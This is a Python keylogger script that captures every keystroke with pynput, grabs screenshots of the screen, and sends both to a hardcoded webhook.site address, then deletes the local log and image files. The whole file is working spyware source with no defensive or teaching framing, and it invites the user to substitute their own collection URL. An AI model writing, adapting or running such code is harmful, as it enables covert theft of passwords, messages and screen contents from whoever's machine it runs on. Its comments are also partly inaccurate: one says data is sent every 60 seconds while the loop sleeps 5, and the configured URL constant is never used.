from pynput import keyboard
import requests
import time
import os
from PIL import ImageGrab
from datetime import datetime

# Configuration
LOG_FILE = "keystrokes.txt"
SCREENSHOT_DIR = "screenshots"
WEBHOOK_URL = "	https://webhook.site/468ebbc3-ea73-43c6-98fe-cfcba3879e9b"  # Replace with your webhook URL

# Ensure screenshot directory exists
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Function to write keystrokes to file
def write_to_file(key):
    try:
        with open(LOG_FILE, "a") as file:
            file.write(key + "\n")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Function to take and save a screenshot
def take_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None

# Function to send data to a webhook
def send_to_webhook():
    try:
        with open(LOG_FILE, "r") as file:
            data = file.read()

        screenshot_path = take_screenshot()  # Capture a screenshot

        if data.strip() or screenshot_path:  # Send only if there's data or a screenshot
            files = {"screenshot": open(screenshot_path, "rb")} if screenshot_path else None
            payload = {"keystrokes": data} if data.strip() else {}

            response = requests.post("https://webhook.site/b02beae2-a010-4d6f-b729-78d57393534d", data=payload, files=files)

            if response.status_code == 200:
                print("Data sent successfully!")
                open(LOG_FILE, "w").close()  # Clear file after sending
            else:
                print(f"Failed to send data: {response.status_code}")

            if screenshot_path:
                os.remove(screenshot_path)  # Delete screenshot after sending
    except Exception as e:
        print(f"Error sending to webhook: {e}")

# Function to handle key press events
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            write_to_file(key.char)  # Normal characters
        else:
            write_to_file(f"[{key.name}]")  # Special keys
    except Exception as e:
        print(f"Error recording key: {e}")

# Start key listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Periodically send data (every 60 seconds)
while True:
    time.sleep(5)
    send_to_webhook()
